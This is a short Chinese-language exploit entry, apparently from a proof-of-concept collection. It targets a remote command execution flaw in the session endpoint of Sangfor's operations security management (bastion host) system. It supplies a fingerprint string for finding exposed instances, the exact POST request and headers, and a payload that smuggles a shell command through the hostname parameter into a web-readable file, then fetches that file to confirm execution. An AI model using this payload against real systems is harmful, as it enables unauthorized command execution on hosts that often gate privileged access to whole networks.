# 深信服运维安全管理系统session存在远程代码执行漏洞

- **系统**：深信服　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`product="SANGFOR-运维安全管理系统"`
- **请求**：`POST /isomp-protocol/protocol/session HTTP/1.1`
- **关键头**：`Content-Length: 76`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
Access_token: null
Priority: u=0, i
hostname=;id>/usr/local/tomcat/webapps/fort/trust/js/hello.txt;&port=11&protocol=x11&resolution=1*11&session_path=1&sid=1
GET /fort/trust/js/hello.txt HTTP/1.1
Host:
```
- **预期**：200　|　—